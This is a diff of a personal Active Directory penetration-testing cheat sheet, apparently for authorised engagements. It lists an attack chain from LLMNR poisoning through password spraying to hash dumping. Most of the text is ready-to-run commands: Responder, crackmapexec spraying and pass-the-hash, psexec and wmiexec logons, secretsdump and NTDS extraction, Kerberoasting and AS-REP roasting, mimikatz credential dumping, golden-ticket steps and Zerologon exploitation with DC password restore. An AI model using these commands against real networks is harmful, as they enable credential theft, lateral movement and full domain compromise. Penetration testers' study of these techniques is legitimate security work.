@@ -1,20 +1,139 @@
-# Syntax for tools in Impacket (Kerbrute, GetNPUsers, secretsdump)
+Mindset: llmnr ---> capture user hash --> cracked ---> spray password with crackmapexec ---> 
+login found ---> secretsdump to get other hashes ---> local admin hashes ---> respray the network with those hashes
 
-# Kerbrute
-
- ./kerbrute userenum --dc <dc_ip> -d <domain_name> <user_list>
-
-
-# GetNPUsers
-
-  python3 GetNPUsers.py -dc-ip <dc_ip> <domain_name>/<username> -no-pass  # ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
+Most of these tools used are from Impacket
 
 
-# secretsdump
+Enumeration
 
-sudo python3 secretsdump.py -just-dc <username>:<password>@<ip> # retrieve all of the password hashes if account has correct permissions
- 
- 
-# Golden Ticket Attack (mimikatz)
+# Implement different -s values in search (get potential users with "sub")
+ldapsearch -H ldap://10.10.193.82:3268/ -x -s <base/sub/one/children> -b '' "(objectClass=*)" "*" + 
 
+ldapsearch -H ldap://10.129.230.220:3268/ -D '' -w '' -b ''
+
+Impacket lookupsid.py (anonymous) (BEST TOOL for getting users) 
+
+lookupsid <domain>/guest@<IP> 
+
+nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials 
+
+Enum4linux 
+
+[enum4linux Cheat Sheet - Commands & Examples (highon.coffee)](https://highon.coffee/blog/enum4linux-cheat-sheet/) 
+
+rpcclient -U '' -N 
+
+https://www.hackingarticles.in/active-directory-enumeration-rpcclient/ 
+
+smbclient/smbmap
+
+
+
+LLMNR Poisoning
+
+sudo responder –I <my_interface> -dw
+
+
+
+Remote Logon Methods
+
+Psexec.py admin@<ip> -hashes <full:hash_value> 
+
+Psexec.py <domain>\<user>:'<password>'@<IP> 
+
+python3 wmiexec.py  <domain>/<user>@<ip> 
+
+evil-winrm 
+
+xfreerdp
+
+
+
+Passback Attacks
+
+https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+
+
+
+Post-Compromise Enumeration
+
+sudo ldapdomaindump ldaps://<target_ip> -u '<first_part_domain>\<user>' -p <password> 
+
+ls to see information that is dumped 
+
+firefox <file_to_view> 
+
+Bloodhound tool 
+
+sudo pip install bloodhound 
+
+sudo neo4j console 
+
+sudo bloodhound  
+
+Login: <neo4j_creds> 
+
+sudo bloodhound-python –d <domain_name> -u <user> -p <password> -ns <dc_ip_usually> -c all
+
+
+Post-Compromise Exploitation
+
+crackmapexec <smb,ldap,winrm,rdp> <ip_range>/24 -u <user> -d <domain_local> -p <password> OR –H <hashed_password>
+
+sudo secretsdump.py <domain_local>/<user>:'<password>'@<ip_address>
+
+local dump: python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL >> hashes
+
+
+
+Kerberoasting
+
+sudo GetUserSPNs.py <domain_local>/<user>:<password> -dc-ip <ip_address> -request
+
+ASREPRoasting 
+
+sudo GetNPUsers.py -dc-ip <ip_address> <domain>/<username> -no-pass
+
+If time synchronization error occur: https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069
+
+
+
+Other Attacks
+
+
+Token Impersonation
+Delegate vs Impersonate tokens (looking for Delegate tokens)
+In meterpreter, type "load incognito"
+
+Group Policy Preferences (GPP Attack)
+https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a
+Metasploit: auxiliary(scanner/smb/smb_enum_gpp)
+gpp-decrypt <encrypted_password>
+
+WDigest Attack
+https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-than-a-hash/
+Use mimikatz to dump passwords from wdigest
+sekurlsa::logonpasswords
+
+Golden Ticket Attack
 https://www.netwrix.com/how_golden_ticket_attack_works.html
+Step1: Load up mimikatz
+Step2: privilege::debug (makes sure that required permissions are applied to do this) 
+Step3: lsadump::lsa /inject /name:krtgt (need domain SID and ntlm hash of krbtgt user) 
+Step4: kerberos::golden /User:<Administrator> /domain:<domain_local> /sid:<SID_of_domain> /krbtgt:<ntlm_hash> /id:500 /ptt 
+Step5: dir \\<IP_of_other_machine\C$> (check to see if you can access other machines)
+
+AD CS Attacks
+Install Certipy (should already be installed on kali)
+sudo apt install certipy-ad
+https://github.com/ly4k/Certipy (refer to this for exploiting different AD CS configurations)
+
+Zero Logon
+Only run the checker unless permission is verified by the client
+https://www.trendmicro.com/en_us/what-is/zerologon.html
+Checker script: https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472
+sudo secretsdump.py -just-dc <domain>/<DC_Name>\$@<dc_ip>
+Restore the DC: sudo restorepassword.py <domain>/<DC_Name>@<DC_Name> -target-ip <dc_ip> -hexpass <hex_pass>
+
+PrintNightmare
+Checker script: https://github.com/xbufu/PrintNightmareCheck
